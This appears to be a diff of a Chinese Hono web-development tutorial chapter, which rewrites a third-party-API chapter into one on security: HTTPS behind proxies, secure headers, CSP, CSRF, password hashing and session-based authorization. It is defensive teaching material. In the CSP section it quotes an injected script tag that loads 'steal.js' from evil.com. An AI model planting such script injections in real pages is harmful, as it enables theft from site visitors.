@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>第 20 章 · 集成第三方 API — Hono 全栈开发教程</title>
+<title>第 20 章 · 安全 — Hono 全栈开发教程</title>
 <link rel="stylesheet" href="assets/style.css">
 </head>
 <body data-chapter="20">
@@ -12,592 +12,636 @@
 <main>
 
 <span class="chapter-eyebrow">第 20 章</span>
-<h1>集成第三方 API</h1>
+<h1>安全</h1>
 <p class="lede">
-  天气、地图、支付、短信、AI —— 现代应用的很大一部分能力来自别人的服务。
-  这一章讲怎么调用它们，以及更重要的：<strong>怎么在它们出问题时不被拖垮</strong>。
+  安全不是上线前加的一个功能，而是贯穿每一章的一条线。
+  这一章把散落在前面的安全知识收拢起来，再补上认证、授权和几种最常见的攻击。
 </p>
 
 <div class="goals">
   <h4>本章目标</h4>
   <ul>
-    <li>在服务端用 <code>fetch</code> 调外部 API，处理超时和重试</li>
-    <li>给云雀旅行的天气组件接上真实数据</li>
-    <li>用缓存把外部调用次数降下来</li>
-    <li>做地理编码并在页面上显示地图</li>
-    <li>用降级和熔断保证「第三方挂了，我不挂」</li>
+    <li>配好 HTTPS，理解反向代理背后的协议判断</li>
+    <li>一行接上安全响应头，理解 CSP 在防什么</li>
+    <li>搞懂 CSRF 的原理和两道防线</li>
+    <li>正确存储密码，实现会话认证和 JWT 认证</li>
+    <li>接入第三方登录，实现基于角色的授权</li>
   </ul>
 </div>
 
 <div id="chapter-toc"></div>
 
-<h2 id="where">在哪里调：前端还是后端</h2>
+<h2 id="https">HTTPS</h2>
+
+<p>
+  没有 HTTPS，所有内容都是明文传输：同一个 WiFi 下的人能看到你的密码，
+  运营商能往页面里插广告，中间人能篡改你下载的 JavaScript。
+</p>
+
+<p>
+  今天没有理由不用 HTTPS：证书免费（Let's Encrypt），主流平台自动配置，
+  而且浏览器把很多能力（地理位置、摄像头、Service Worker）设成了 HTTPS 独占。
+</p>
+
+<div class="tw">
+<table>
+  <tr><th>部署方式</th><th>证书怎么来</th></tr>
+  <tr><td>Cloudflare Workers / Vercel / Netlify</td><td><strong>自动，什么都不用做</strong></td></tr>
+  <tr><td>自己的服务器 + Nginx/Caddy</td><td>Caddy 全自动；Nginx 配 certbot 自动续期</td></tr>
+  <tr><td>云厂商负载均衡</td><td>在控制台申请托管证书</td></tr>
+  <tr><td>本地开发</td><td><code>mkcert</code> 生成本地信任的证书，或者直接用 http</td></tr>
+</table>
+</div>
+
+<h3>代理背后的坑</h3>
 
 <figure>
-<svg class="dgm" viewBox="0 0 760 250" role="img" aria-label="前端直连与后端代理两种方式">
-  <rect class="bx-r" x="20" y="20" width="345" height="210" rx="10"/>
-  <text class="ttl on-r" x="192" y="44" text-anchor="middle">浏览器直接调第三方</text>
-  <text class="sm" x="36" y="72">浏览器 → api.weather.gov</text>
-  <text class="sm on-r" x="36" y="102">&#10007; API Key 会暴露在前端代码里</text>
-  <text class="sm on-r" x="36" y="124">&#10007; 每个用户都消耗一次配额</text>
-  <text class="sm on-r" x="36" y="146">&#10007; 对方不支持 CORS 就调不通</text>
-  <text class="sm on-r" x="36" y="168">&#10007; 没法缓存，没法统一处理错误</text>
-  <text class="sm on-g" x="36" y="198">&#10003; 唯一合适的情况：地图 SDK 这类</text>
-  <text class="sm on-g" x="36" y="216">&nbsp;&nbsp;&nbsp;本来就为前端设计、Key 可域名限制的</text>
+<svg class="dgm" viewBox="0 0 760 200" role="img" aria-label="反向代理后面的应用看到的是 HTTP">
+  <rect class="bx-b" x="20" y="60" width="120" height="56" rx="8"/>
+  <text class="sm" x="80" y="92" text-anchor="middle">浏览器</text>
 
-  <rect class="bx-g" x="395" y="20" width="345" height="210" rx="10"/>
-  <text class="ttl on-g" x="567" y="44" text-anchor="middle">后端代理（推荐）</text>
-  <text class="sm" x="411" y="72">浏览器 → 你的 Hono → api.weather.gov</text>
-  <text class="sm on-g" x="411" y="102">&#10003; Key 留在服务端，永不外泄</text>
-  <text class="sm on-g" x="411" y="124">&#10003; 一次调用可以服务成千上万用户</text>
-  <text class="sm on-g" x="411" y="146">&#10003; 没有 CORS 问题</text>
-  <text class="sm on-g" x="411" y="168">&#10003; 能缓存、能重试、能降级</text>
-  <text class="sm on-g" x="411" y="190">&#10003; 能把对方的数据格式转成你想要的</text>
-  <text class="sm" x="411" y="216">代价：多一跳延迟（缓存后可忽略）</text>
+  <path class="ln-g" d="M144 88 H286" marker-end="url(#ar)"/>
+  <text class="sm on-g" x="215" y="80" text-anchor="middle">HTTPS · 加密</text>
+
+  <rect class="bx-a" x="290" y="52" width="150" height="72" rx="10"/>
+  <text class="ttl on-a" x="365" y="76" text-anchor="middle">反向代理</text>
+  <text class="sm" x="365" y="94" text-anchor="middle">Nginx / 负载均衡</text>
+  <text class="sm" x="365" y="112" text-anchor="middle">在这里解密</text>
+
+  <path class="ln-r" d="M444 88 H586" style="stroke:var(--red)" marker-end="url(#ar)"/>
+  <text class="sm on-r" x="515" y="80" text-anchor="middle">HTTP · 内网明文</text>
+
+  <rect class="bx" x="590" y="60" width="150" height="56" rx="8"/>
+  <text class="sm" x="665" y="86" text-anchor="middle">你的 Hono 应用</text>
+  <text class="sm" x="665" y="104" text-anchor="middle">以为自己在跑 HTTP</text>
+
+  <rect class="bx-d" x="140" y="146" width="480" height="44" rx="8"/>
+  <text class="sm" x="380" y="166" text-anchor="middle">代理会加一个头告诉你真相：X-Forwarded-Proto: https</text>
+  <text class="sm" x="380" y="184" text-anchor="middle">判断「用户是不是走的 HTTPS」要看它，不能看连接本身</text>
 </svg>
-<figcaption>图 20-1　默认走后端代理，除非有明确理由</figcaption>
-</figure>
-
-<div class="box warn">
-  <div class="t">&#9888; API Key 放前端 = 公开你的信用卡</div>
-  <p>
-    「打包压缩之后看不出来」是错觉 —— 打开浏览器的 Network 面板，
-    Key 就明晃晃写在请求头或 URL 里。有人写过爬虫专门扫 GitHub 和网页找泄露的 Key。
-    <strong>能计费的 Key 一律不进前端。</strong>
-  </p>
-</div>
-
-<h2 id="fetch">服务端的 fetch</h2>
-
-<p>
-  Hono 的运行时都内置了 <code>fetch</code>，不用装 axios 之类的库。但直接裸用有几个问题：
-</p>
-
-<div class="code" data-lang="ts">
-<pre>
-// ❌ 三个隐患
-const res = await fetch(url)      // ① 对方不响应就永远挂着
-const data = await res.json()     // ② 返回 500 时 res.ok 是 false，但这里不会抛错
-</pre>
-</div>
-
-<p>写一个带超时、重试和错误检查的封装：</p>
-
-<div class="code" data-lang="ts" data-file="src/lib/http.ts">
-<pre>
-export class HttpError extends Error {
-  constructor(public status: number, public url: string, message: string) {
-    super(message)
-  }
-}
-
-type Options = RequestInit &amp; {
-  timeoutMs?: number
-  retries?: number
-}
-
-export async function fetchJson&lt;T&gt;(url: string, opts: Options = {}): Promise&lt;T&gt; {
-  const { timeoutMs = 5000, retries = 2, ...init } = opts
-
-  for (let attempt = 0; attempt &lt;= retries; attempt++) {
-    // AbortSignal.timeout 是标准 API，所有运行时都有
-    const signal = AbortSignal.timeout(timeoutMs)
-
-    try {
-      const res = await fetch(url, {
-        ...init,
-        signal,
-        headers: {
-          'User-Agent': 'MeadowlarkTravel/1.0 (contact@meadowlarktravel.com)',
-          Accept: 'application/json',
-          ...init.headers,
-        },
-      })
-
-      // 4xx 是我们的问题，重试没用，直接抛
-      if (res.status &gt;= 400 &amp;&amp; res.status &lt; 500) {
-        throw new HttpError(res.status, url, `客户端错误 ${res.status}`)
-      }
-
-      // 5xx 和 429 可以重试
-      if (!res.ok) {
-        throw new HttpError(res.status, url, `服务端错误 ${res.status}`)
-      }
-
-      return (await res.json()) as T
-    } catch (err) {
-      const isLast = attempt === retries
-      const notRetryable = err instanceof HttpError &amp;&amp; err.status &lt; 500 &amp;&amp; err.status !== 429
-
-      if (isLast || notRetryable) throw err
-
-      // 指数退避 + 随机抖动，避免所有实例同时重试
-      const delay = 2 ** attempt * 200 + Math.random() * 200
-      await new Promise((r) =&gt; setTimeout(r, delay))
-    }
-  }
-
-  throw new Error('unreachable')
-}
-</pre>
-</div>
-
-<div class="box key">
-  <div class="t">&#9733; 为什么要「指数退避 + 抖动」</div>
-  <p>
-    对方服务过载时，如果所有客户端都在固定 1 秒后重试，就会形成一波又一波的冲击，
-    让它永远缓不过来 —— 这叫<strong>惊群效应</strong>。<br>
-    每次等待时间翻倍（200ms、400ms、800ms）给对方喘息时间；
-    再加一点随机抖动，把重试时刻打散。
-  </p>
-</div>
-
-<div class="box warn">
-  <div class="t">&#9888; 不是所有请求都能重试</div>
-  <p>
-    <strong>幂等</strong>的操作（GET、PUT、DELETE）重试是安全的。<br>
-    <strong>非幂等</strong>的操作（POST 创建订单、发起支付）重试可能导致重复下单。
-    这类请求要么不重试，要么让对方支持「幂等键」（每次请求带一个唯一 ID，对方据此去重）。
-    反过来，<strong>你自己的接口也该支持幂等键</strong>，否则别人重试你时同样会出问题 —— 见第 21 章。
-  </p>
-</div>
-
-<h2 id="weather">给天气组件接上真数据</h2>
-
-<p>
-  第 7 章我们做了一个天气组件，用的是假数据。现在换成美国国家气象局的真实 API
-  （它免费、不需要 Key，正好用来演示）。
-</p>
-
-<div class="code" data-lang="ts" data-file="src/lib/weather.ts">
-<pre>
-import { fetchJson } from './http'
-
-export type Forecast = {
-  name: string
-  weather: string
-  temp: string
-  iconUrl: string
-  forecastUrl: string
-}
-
-const LOCATIONS = [
-  { name: '波特兰', lat: 45.5155, lng: -122.6793 },
-  { name: '本德',   lat: 44.0582, lng: -121.3153 },
-  { name: '曼扎尼塔', lat: 45.7184, lng: -123.9351 },
-]
-
-async function fetchOne(loc: (typeof LOCATIONS)[number]): Promise&lt;Forecast&gt; {
-  // 第一步：用经纬度换到预报接口地址
-  const points = await fetchJson&lt;{ properties: { forecast: string } }&gt;(
-    `https://api.weather.gov/points/${loc.lat.toFixed(4)},${loc.lng.toFixed(4)}`
-  )
-
-  // 第二步：取预报
-  const data = await fetchJson&lt;{
-    properties: {
-      periods: {
-        shortForecast: string
-        temperature: number
-        temperatureUnit: string
-        icon: string
-      }[]
-    }
-  }&gt;(points.properties.forecast)
-
-  const now = data.properties.periods[0]
-
-  return {
-    name: loc.name,
-    weather: now.shortForecast,
-    temp: `${now.temperature} °${now.temperatureUnit}`,
-    iconUrl: now.icon,
-    forecastUrl: points.properties.forecast,
-  }
-}
-
-export async function getForecasts(): Promise&lt;Forecast[]&gt; {
-  // 并发请求，而不是一个接一个
-  const results = await Promise.allSettled(LOCATIONS.map(fetchOne))
-
-  // 部分失败不影响其他，只是少显示一个城市
-  return results
-    .filter((r): r is PromiseFulfilledResult&lt;Forecast&gt; =&gt; r.status === 'fulfilled')
-    .map((r) =&gt; r.value)
-}
-</pre>
-</div>
-
-<div class="box key">
-  <div class="t">&#9733; <code>Promise.allSettled</code> 还是 <code>Promise.all</code></div>
-  <p>
-    <code>Promise.all</code>：任何一个失败，整个都失败。适合「缺一不可」的场景。<br>
-    <code>Promise.allSettled</code>：等所有的都结束，分别报告成败。<br>
-    天气组件里，一个城市取不到不该让整个组件消失 —— 所以用 <code>allSettled</code>。
-  </p>
-</div>
-
-<h2 id="cache">缓存：最重要的一步</h2>
-
-<p>
-  上面的代码每次页面渲染都会打 6 次外部请求。一千个用户访问首页就是 6000 次 ——
-  又慢、又可能被对方限流、还可能产生费用。天气数据 15 分钟更新一次就够了。
-</p>
-
-<div class="code" data-lang="ts" data-file="src/lib/cached.ts">
-<pre>
-type Entry&lt;T&gt; = { value: T; expiresAt: number }
-
-/**
- * 把一个异步函数包装成带缓存的版本。
- * 关键特性：缓存过期后如果刷新失败，会继续返回旧数据（stale-while-error）
- */
-export function withCache&lt;T&gt;(
-  fn: () =&gt; Promise&lt;T&gt;,
-  ttlMs: number
-): () =&gt; Promise&lt;T&gt; {
-  let entry: Entry&lt;T&gt; | null = null
-  let inflight: Promise&lt;T&gt; | null = null
-
-  return async () =&gt; {
-    const now = Date.now()
-
-    // 缓存有效，直接返回
-    if (entry &amp;&amp; entry.expiresAt &gt; now) return entry.value
-
-    // 已经有一个请求在路上了，跟着它就行（避免并发时打出多个请求）
-    if (inflight) return inflight
-
-    inflight = fn()
-      .then((value) =&gt; {
-        entry = { value, expiresAt: Date.now() + ttlMs }
-        return value
-      })
-      .catch((err) =&gt; {
-        // 刷新失败：有旧数据就先用旧的，总比页面报错强
-        if (entry) {
-          console.warn('刷新失败，继续使用过期数据', err)
-          return entry.value
-        }
-        throw err
-      })
-      .finally(() =&gt; { inflight = null })
-
-    return inflight
-  }
-}
-</pre>
-</div>
-
-<div class="code" data-lang="ts">
-<pre>
-export const getCachedForecasts = withCache(getForecasts, 15 * 60 * 1000)
-</pre>
-</div>
-
-<figure>
-<svg class="dgm" viewBox="0 0 760 220" role="img" aria-label="缓存把外部请求量降下来">
-  <rect class="bx-r" x="20" y="20" width="345" height="80" rx="10"/>
-  <text class="ttl on-r" x="192" y="44" text-anchor="middle">没有缓存</text>
-  <text class="sm" x="36" y="68">1000 次页面访问 → 6000 次外部请求</text>
-  <text class="sm on-r" x="36" y="88">每次页面渲染都要等 300–800 ms</text>
-
-  <rect class="bx-g" x="395" y="20" width="345" height="80" rx="10"/>
-  <text class="ttl on-g" x="567" y="44" text-anchor="middle">15 分钟缓存</text>
-  <text class="sm" x="411" y="68">1000 次页面访问 → 最多 6 次外部请求</text>
-  <text class="sm on-g" x="411" y="88">除了第一次，之后都是 0 ms</text>
-
-  <text class="ttl" x="20" y="130">进程内缓存 vs 共享缓存</text>
-  <rect class="bx-b" x="20" y="142" width="345" height="70" rx="10"/>
-  <text class="sm on-b" x="36" y="164">进程内（上面的实现）</text>
-  <text class="sm" x="36" y="184">简单、零延迟，但每个实例一份</text>
-  <text class="sm" x="36" y="202">10 个实例 = 10 倍外部请求</text>
-
-  <rect class="bx-p" x="395" y="142" width="345" height="70" rx="10"/>
-  <text class="sm on-p" x="411" y="164">共享缓存（KV / Redis）</text>
-  <text class="sm" x="411" y="184">所有实例共用一份，请求量真正降到最低</text>
-  <text class="sm" x="411" y="202">边缘环境必须用这种（实例极多且短命）</text>
-</svg>
-<figcaption>图 20-2　实例越多，共享缓存越重要</figcaption>
+<figcaption>图 20-1　在代理后面，应用看到的协议不是用户看到的协议</figcaption>
 </figure>
 
 <div class="code" data-lang="ts">
 <pre>
-// 边缘环境的版本：用 KV 做共享缓存
-export async function getForecastsFromKV(kv: KVNamespace): Promise&lt;Forecast[]&gt; {
-  const cached = await kv.get&lt;Forecast[]&gt;('weather:forecasts', 'json')
-  if (cached) return cached
-
-  const fresh = await getForecasts()
-  await kv.put('weather:forecasts', JSON.stringify(fresh), { expirationTtl: 900 })
-  return fresh
+function isSecure(c: Context) {
+  const proto = c.req.header('x-forwarded-proto')
+  if (proto) return proto.split(',')[0].trim() === 'https'
+  return new URL(c.req.url).protocol === 'https:'
 }
-</pre>
-</div>
 
-<div class="code" data-lang="tsx">
-<pre>
-// 在中间件里注入，让所有页面都能用（第 7 章的 partial 现在有真数据了）
+// 强制跳转 HTTPS
 app.use('*', async (c, next) =&gt; {
-  c.set('forecasts', await getForecastsFromKV(c.env.CACHE))
+  if (isProduction &amp;&amp; !isSecure(c)) {
+    const url = new URL(c.req.url)
+    url.protocol = 'https:'
+    return c.redirect(url.toString(), 301)
+  }
   await next()
 })
 </pre>
 </div>
 
-<h2 id="geocode">地理编码与地图</h2>
+<div class="box warn">
+  <div class="t">&#9888; 只信任你自己的代理发来的头</div>
+  <p>
+    <code>X-Forwarded-Proto</code> 是个普通请求头，<strong>任何人都能伪造</strong>。
+    只有当你确定请求一定经过自己的代理（且代理会覆盖这个头）时才能信任它。
+    如果应用可以被直接访问，攻击者就能伪造这个头绕过你的 HTTPS 检查。
+  </p>
+</div>
 
-<p>
-  <strong>地理编码</strong>就是把「俄勒冈州胡德河市」这样的地址转成经纬度。
-  这类接口通常按调用次数收费，所以更要缓存 —— 而且是<strong>永久缓存</strong>：
-  一个地址的坐标基本不会变。
-</p>
+<h2 id="headers">安全响应头</h2>
 
 <div class="code" data-lang="ts">
 <pre>
-export async function geocode(address: string, apiKey: string) {
-  const url = new URL('https://maps.googleapis.com/maps/api/geocode/json')
-  url.searchParams.set('address', address)
-  url.searchParams.set('key', apiKey)
+import { secureHeaders } from 'hono/secure-headers'
 
-  const data = await fetchJson&lt;{
-    status: string
-    results: { geometry: { location: { lat: number; lng: number } } }[]
-  }&gt;(url.toString())
-
-  if (data.status !== 'OK' || data.results.length === 0) return null
-
-  return data.results[0].geometry.location
-}
+app.use('*', secureHeaders())
 </pre>
 </div>
 
-<div class="code" data-lang="ts" data-file="scripts/geocode-vacations.ts">
+<p>这一行会加上一整组头。逐个看看它们在防什么：</p>
+
+<div class="tw">
+<table>
+  <tr><th>响应头</th><th>防的是</th></tr>
+  <tr><td><code>Strict-Transport-Security</code></td><td>告诉浏览器「以后只用 HTTPS 访问我」，防降级攻击</td></tr>
+  <tr><td><code>X-Content-Type-Options: nosniff</code></td><td>禁止浏览器猜测内容类型。防止上传的「图片」被当成脚本执行</td></tr>
+  <tr><td><code>X-Frame-Options: SAMEORIGIN</code></td><td>禁止别人把你的页面嵌进 iframe，防点击劫持</td></tr>
+  <tr><td><code>Referrer-Policy</code></td><td>控制跳转时泄露多少来源 URL 信息</td></tr>
+  <tr><td><code>Content-Security-Policy</code></td><td><strong>最强的一道</strong>：限定只能从哪些来源加载脚本、样式、图片</td></tr>
+</table>
+</div>
+
+<h3>CSP：XSS 的最后一道防线</h3>
+
+<div class="code" data-lang="ts">
 <pre>
-// 一次性脚本：把坐标写进数据库，之后再也不用调这个 API
-const rows = await db.select().from(vacations).where(isNull(vacations.lat))
-
-for (const v of rows) {
-  const loc = await geocode(v.locationSearch, process.env.GOOGLE_API_KEY!)
-  if (!loc) {
-    console.warn(`地理编码失败：${v.sku} · ${v.locationSearch}`)
-    continue
-  }
-
-  await db.update(vacations)
-    .set({ lat: loc.lat, lng: loc.lng })
-    .where(eq(vacations.sku, v.sku))
-
-  console.log(`${v.name} → ${loc.lat}, ${loc.lng}`)
-  await new Promise((r) =&gt; setTimeout(r, 200))   // 尊重对方的速率限制
-}
+app.use('*', secureHeaders({
+  contentSecurityPolicy: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'"],                          // 只允许自己域名下的脚本
+    styleSrc: ["'self'", "'unsafe-inline'"],
+    imgSrc: ["'self'", 'data:', 'https://cdn.meadowlarktravel.com'],
+    connectSrc: ["'self'", 'https://api.meadowlarktravel.com'],
+    frameAncestors: ["'none'"],                     // 谁都不能嵌我
+    objectSrc: ["'none'"],
+    upgradeInsecureRequests: [],
+  },
+}))
 </pre>
 </div>
 
 <div class="box key">
-  <div class="t">&#9733; 分清「一次性」和「每次请求」</div>
+  <div class="t">&#9733; CSP 为什么重要</div>
   <p>
-    地理编码属于<strong>数据准备</strong>，应该在录入数据时做一次，把结果存进数据库。<br>
-    绝对不要在渲染页面时实时调用 —— 那是把一个 O(1) 的操作变成了 O(访问量)。
-    <em>用户请求路径上的每一次外部调用，都是一个潜在的故障点和账单项。</em>
+    假设你的模板某处漏掉了转义，攻击者成功注入了
+    <code>&lt;script src="https://evil.com/steal.js"&gt;</code>。<br>
+    有 CSP 的话，浏览器会<strong>拒绝加载</strong>这个脚本，因为 <code>evil.com</code> 不在
+    <code>scriptSrc</code> 白名单里。<br>
+    <strong>CSP 是「假设我的其他防护已经失败了」之后的兜底。</strong>纵深防御的典范。
   </p>
-</div>
-
-<h3>显示地图</h3>
-
-<p>
-  地图 SDK 是少数应该在前端调用的场景（它本来就是画在浏览器里的）。
-  但仍然要保护好 Key：
-</p>
-
-<div class="code" data-lang="tsx">
-<pre>
-export const VacationsMap: FC&lt;{ vacations: Vacation[]; mapKey: string }&gt; = ({
-  vacations, mapKey,
-}) =&gt; (
-  &lt;&gt;
-    &lt;div id="map" style="height:480px"&gt;&lt;/div&gt;
-    {/* 用 JSON 传数据给前端脚本，避免拼接字符串造成注入 */}
-    &lt;script
-      type="application/json"
-      id="map-data"
-      dangerouslySetInnerHTML={{
-        __html: JSON.stringify(
-          vacations
-            .filter((v) =&gt; v.lat &amp;&amp; v.lng)
-            .map((v) =&gt; ({ name: v.name, lat: v.lat, lng: v.lng, url: `/vacations/${v.slug}` }))
-        ),
-      }}
-    /&gt;
-    &lt;script src={`https://maps.googleapis.com/maps/api/js?key=${mapKey}&amp;callback=initMap`} async&gt;&lt;/script&gt;
-    &lt;script src="/js/map.js" defer&gt;&lt;/script&gt;
-  &lt;/&gt;
-)
-</pre>
 </div>
 
 <div class="box tip">
-  <div class="t">&#128161; 前端 Key 要加限制</div>
+  <div class="t">&#128161; 先用报告模式</div>
   <p>
-    地图这类必须暴露在前端的 Key，一定要在服务商控制台设置<strong>域名白名单</strong>
-    （只允许 <code>meadowlarktravel.com</code> 使用）和<strong>用量上限</strong>。
-    这样别人抄走了也用不了，而且万一被滥用，损失有上限。
+    CSP 配紧了很容易把自己的功能搞坏（第三方统计脚本、内联样式）。
+    先用 <code>Content-Security-Policy-Report-Only</code> 上线，
+    观察浏览器控制台报告了哪些违规，调整好再切成强制模式。
   </p>
 </div>
 
-<h2 id="resilience">别人挂了，我不能挂</h2>
+<h2 id="csrf">CSRF</h2>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 270" role="img" aria-label="CSRF 攻击的原理">
+  <text class="ttl on-r" x="20" y="24">攻击是这样发生的</text>
+
+  <rect class="bx" x="20" y="36" width="200" height="60" rx="8"/>
+  <text class="sm" x="120" y="58" text-anchor="middle">① 你登录了 bank.com</text>
+  <text class="sm" x="120" y="78" text-anchor="middle">浏览器存了会话 Cookie</text>
+
+  <path class="ln" d="M224 66 H286" marker-end="url(#ar)"/>
+
+  <rect class="bx-r" x="290" y="36" width="200" height="60" rx="8"/>
+  <text class="sm on-r" x="390" y="58" text-anchor="middle">② 你又打开了 evil.com</text>
+  <text class="sm" x="390" y="78" text-anchor="middle">（一封邮件里的链接）</text>
+
+  <path class="ln" d="M494 66 H556" marker-end="url(#ar)"/>
+
+  <rect class="bx-r" x="560" y="26" width="180" height="80" rx="8"/>
+  <text class="sm on-r" x="650" y="48" text-anchor="middle">③ 页面里藏着</text>
+  <text class="mono sm" x="650" y="68" text-anchor="middle">&lt;form action=</text>
+  <text class="mono sm" x="650" y="84" text-anchor="middle">"bank.com/transfer"&gt;</text>
+  <text class="sm on-r" x="650" y="100" text-anchor="middle">自动提交</text>
+
+  <path class="ln-r" d="M650 110 V150 H200 V186" style="stroke:var(--red)" marker-end="url(#ar)"/>
+
+  <rect class="bx-r" x="60" y="190" width="280" height="60" rx="8"/>
+  <text class="sm on-r" x="200" y="212" text-anchor="middle">④ 浏览器<tspan>自动带上</tspan> bank.com 的 Cookie</text>
+  <text class="sm on-r" x="200" y="234" text-anchor="middle">服务器认为是你本人操作 → 转账成功</text>
+
+  <rect class="bx-g" x="400" y="176" width="340" height="88" rx="10"/>
+  <text class="ttl on-g" x="570" y="198" text-anchor="middle">关键点</text>
+  <text class="sm" x="416" y="220">攻击者<tspan>读不到</tspan>响应（同源策略挡着）</text>
+  <text class="sm" x="416" y="240">但他不需要读 —— 请求已经生效了</text>
+  <text class="sm" x="416" y="258">所以危险的是「有副作用」的请求</text>
+</svg>
+<figcaption>图 20-2　CSRF 利用的是「浏览器会自动带上 Cookie」这个特性</figcaption>
+</figure>
+
+<h3>两道防线</h3>
+
+<div class="code" data-lang="ts">
+<pre>
+// 第一道：SameSite Cookie（第 9 章讲过）
+setCookie(c, 'sid', id, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'Lax',    // 跨站 POST 不会带上这个 Cookie
+})
+
+// 第二道：Hono 的 CSRF 中间件
+import { csrf } from 'hono/csrf'
+
+app.use('*', csrf({ origin: 'https://meadowlarktravel.com' }))
+</pre>
+</div>
 
 <p>
-  第三方服务一定会出问题 —— 超时、限流、返回格式变了、干脆下线。
-  你的应用要能撑住。三个层次：
+  <code>csrf()</code> 中间件检查请求的 <code>Origin</code> 头是否属于你的站点，
+  不匹配就拒绝。对于表单提交场景，这已经足够。
 </p>
 
-<h3>① 降级</h3>
+<div class="box note">
+  <div class="t">&#9432; 用令牌的做法</div>
+  <p>
+    更传统的方案是「双重提交令牌」：服务器给每个表单生成一个随机 token，
+    同时放在隐藏字段和 Cookie 里，提交时比对两者是否一致。
+    攻击者的页面读不到你的 Cookie，所以造不出正确的隐藏字段。
+    <br>
+    今天 <code>SameSite=Lax</code> + Origin 校验对绝大多数应用已经够用。
+    需要更严格时（比如支付），再叠加令牌。
+  </p>
+</div>
 
-<div class="code" data-lang="tsx">
+<div class="box tip">
+  <div class="t">&#128161; 纯 API 通常不需要 CSRF 防护</div>
+  <p>
+    CSRF 依赖「浏览器自动带 Cookie」。如果你的 API 用
+    <code>Authorization: Bearer</code> 头做认证，浏览器<strong>不会</strong>自动带上这个头，
+    攻击者也造不出来 —— 天然免疫 CSRF。<br>
+    <strong>用 Cookie 认证就要防 CSRF，用 Bearer 令牌就不用。</strong>
+  </p>
+</div>
+
+<h2 id="passwords">密码</h2>
+
+<div class="box warn">
+  <div class="t">&#9888; 关于密码存储的三条铁律</div>
+  <ol>
+    <li><strong>永远不要存明文。</strong>数据库一旦泄露，所有用户在其他网站的账号也跟着完蛋
+        （因为很多人复用密码）。</li>
+    <li><strong>不要用 MD5 或 SHA-256。</strong>它们设计目标是「快」，
+        现代显卡每秒能试几十亿次，一个 8 位密码几分钟就能爆破出来。</li>
+    <li><strong>用专门的密码哈希算法</strong>：Argon2id（首选）、bcrypt、scrypt。
+        它们故意设计得慢且消耗内存，让爆破成本高到不可行。</li>
+  </ol>
+</div>
+
+<div class="code" data-lang="ts">
 <pre>
-app.get('/', async (c) =&gt; {
-  let forecasts: Forecast[] = []
-  try {
-    forecasts = await getCachedForecasts()
-  } catch (err) {
-    console.error('天气数据不可用', err)
-    // 不抛出去。首页的主要内容和天气无关
+// Node.js / Bun：用 Argon2
+import { hash, verify } from '@node-rs/argon2'
+
+const passwordHash = await hash(plainPassword)      // 注册时
+const ok = await verify(passwordHash, plainPassword) // 登录时
+</pre>
+</div>
+
+<div class="code" data-lang="ts">
+<pre>
+// 边缘运行时（Workers）：原生模块用不了，用 Web Crypto 的 PBKDF2
+async function hashPassword(password: string): Promise&lt;string&gt; {
+  const salt = crypto.getRandomValues(new Uint8Array(16))
+  const key = await crypto.subtle.importKey(
+    'raw', new TextEncoder().encode(password), 'PBKDF2', false, ['deriveBits']
+  )
+  const bits = await crypto.subtle.deriveBits(
+    { name: 'PBKDF2', salt, iterations: 210_000, hash: 'SHA-256' },
+    key, 256
+  )
+  return `pbkdf2$210000$${b64(salt)}$${b64(new Uint8Array(bits))}`
+}
+</pre>
+</div>
+
+<div class="box note">
+  <div class="t">&#9432; 最好的密码方案是没有密码</div>
+  <p>
+    自己实现密码认证意味着你要负责：安全存储、重置流程、防撞库、防暴力破解、
+    可能还有双因素认证。<br>
+    <strong>能用第三方登录（Google / GitHub / 微信）就用</strong> —— 见下文。
+    或者用「魔法链接」：用户输入邮箱，你发一封带一次性链接的邮件，点击即登录。
+    没有密码，就没有密码泄露。
+  </p>
+</div>
+
+<h2 id="authn">认证与授权</h2>
+
+<div class="vs">
+  <div class="old">
+    <div class="h">认证 Authentication</div>
+    <div style="padding:12px 16px;font-size:14.5px">
+      <strong>你是谁？</strong><br>
+      验证身份。用户名密码、第三方登录、令牌。<br>
+      失败返回 <strong>401</strong>。
+    </div>
+  </div>
+  <div class="new">
+    <div class="h">授权 Authorization</div>
+    <div style="padding:12px 16px;font-size:14.5px">
+      <strong>你能做什么？</strong><br>
+      验证权限。角色、所有权、订阅等级。<br>
+      失败返回 <strong>403</strong>。
+    </div>
+  </div>
+</div>
+
+<h3>方案一：会话认证（适合网页）</h3>
+
+<div class="code" data-lang="ts">
+<pre>
+app.post('/login', zValidator('form', loginSchema), async (c) =&gt; {
+  const { email, password } = c.req.valid('form')
+
+  const user = await db.getUserByEmail(email)
+
+  // 注意：用户不存在和密码错误要返回同样的信息和同样的耗时
+  // 否则攻击者可以用它来枚举哪些邮箱注册过
+  if (!user || !(await verify(user.passwordHash, password))) {
+    return c.html(&lt;LoginPage error="邮箱或密码不正确" /&gt;, 401)
   }
 
-  return c.html(&lt;HomePage forecasts={forecasts} /&gt;)
+  const session = c.get('session')
+  session.userId = user.id
+  session.createdAt = Date.now()
+
+  return c.redirect('/account', 303)
 })
 </pre>
 </div>
 
-<div class="code" data-lang="tsx">
+<div class="code" data-lang="ts" data-file="src/middleware/auth.ts">
 <pre>
-// 视图要能处理「没有数据」
-export const WeatherWidget: FC&lt;{ forecasts: Forecast[] }&gt; = ({ forecasts }) =&gt; {
-  if (forecasts.length === 0) return null   // 干脆不显示，好过显示一个报错框
-  return &lt;div class="weather"&gt;{/* ... */}&lt;/div&gt;
+export const loadUser = createMiddleware&lt;{ Variables: { user?: User } }&gt;(
+  async (c, next) =&gt; {
+    const userId = c.get('session')?.userId
+    if (userId) {
+      const user = await db.getUserById(String(userId))
+      if (user) c.set('user', user)
+    }
+    await next()
+  }
+)
+
+export const requireLogin = createMiddleware(async (c, next) =&gt; {
+  if (!c.get('user')) {
+    // 记住原本想去的地方，登录后跳回来
+    c.get('session').returnTo = c.req.path
+    return c.redirect('/login', 303)
+  }
+  await next()
+})
+
+export function requireRole(...roles: string[]) {
+  return createMiddleware(async (c, next) =&gt; {
+    const user = c.get('user')
+    if (!user) return c.redirect('/login', 303)
+    if (!roles.includes(user.role)) {
+      return c.html(&lt;ForbiddenPage /&gt;, 403)
+    }
+    await next()
+  })
 }
 </pre>
 </div>
-
-<h3>② 熔断</h3>
-
-<p>
